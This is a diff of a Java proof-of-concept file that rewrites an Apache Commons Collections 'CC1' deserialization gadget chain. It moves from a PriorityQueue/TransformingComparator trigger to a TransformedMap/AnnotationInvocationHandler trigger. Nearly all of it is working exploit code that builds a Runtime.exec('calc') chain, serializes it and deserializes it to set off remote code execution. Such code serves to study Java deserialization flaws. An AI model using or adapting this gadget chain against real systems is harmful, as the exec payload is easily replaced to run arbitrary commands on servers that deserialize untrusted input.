@@ -1,47 +1,69 @@
-//CC链1 
+package com.test.ApacheCC1;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.comparators.TransformingComparator;
+import org.apache.commons.collections.map.TransformedMap;
 
 import java.io.*;
-import java.util.PriorityQueue;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+import java.util.HashMap;
+import java.util.Map;
 
-public class CC1demo {
+public class CC1test {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
+        ConstantTransformer ct = new ConstantTransformer(Runtime.class);
 
-    public static void main(String[] args) throws Exception {
-        // 真实利用链
-        Transformer[] transformers = new Transformer[] {
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod",
-                        new Class[] { String.class, Class[].class },
-                        new Object[] { "getRuntime", new Class[0] }),
-                new InvokerTransformer("invoke",
-                        new Class[] { Object.class, Object[].class },
-                        new Object[] { null, new Object[0] }),
-                new InvokerTransformer("exec",
-                        new Class[] { String.class },
-                        new Object[] { "calc" })
-        };
+        String methodName1 = "getMethod";
+        Class[] paramTypes1 = {String.class, Class[].class};
+        Object[] args1 = {"getRuntime", null};
+        InvokerTransformer it1 = new InvokerTransformer(methodName1, paramTypes1, args1);
 
-        Transformer transformerChain = new ChainedTransformer(transformers);
-        TransformingComparator comparator = new TransformingComparator(transformerChain);
+        String methodName2 = "invoke";
+        Class[] paramTypes2 = {Object.class, Object[].class};
+        Object[] args2 = {null, null};
+        InvokerTransformer it2 = new InvokerTransformer(methodName2, paramTypes2, args2);
 
-        // PriorityQueue 反序列化入口
-        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
-        // 填充两个元素，占位即可
-        priorityQueue.add(1);
-        priorityQueue.add(1);
+        String methodName3 = "exec";
+        Class[] paramTypes3 = {String.class};
+        Object[] args3 = {"calc"};
+        InvokerTransformer it3 = new InvokerTransformer(methodName3, paramTypes3, args3);
 
-        // Serialize
-        try (ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("payload.ser"))) {
-            out.writeObject(priorityQueue);
-        }
+        Transformer[] transformers = {ct, it1, it2, it3};
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        /*
+        ChainedTransformer
+        */
 
-        // Deserialize (触发RCE)
-        try (ObjectInputStream in = new ObjectInputStream(new FileInputStream("payload.ser"))) {
-            in.readObject(); // 会弹计算器
-        }
+        HashMap<Object, Object> map = new HashMap<>();
+        map.put("value", "");
+        Map decorated = TransformedMap.decorate(map, null, chainedTransformer);
+        /*
+        TransformedMap.decorate
+        */
+
+        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor annoConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        annoConstructor.setAccessible(true);
+        Object poc = annoConstructor.newInstance(Target.class, decorated);
+		/*
+		AnnotationInvocationHandler
+		*/
+
+        serial(poc);
+        unserial();
+    }
+
+    public static void serial(Object obj) throws IOException {
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("cc1.bin"));
+        out.writeObject(obj);
+    }
+
+    public static void unserial() throws IOException, ClassNotFoundException {
+        ObjectInputStream in = new ObjectInputStream(new FileInputStream("cc1.bin"));
+        in.readObject();
     }
 }
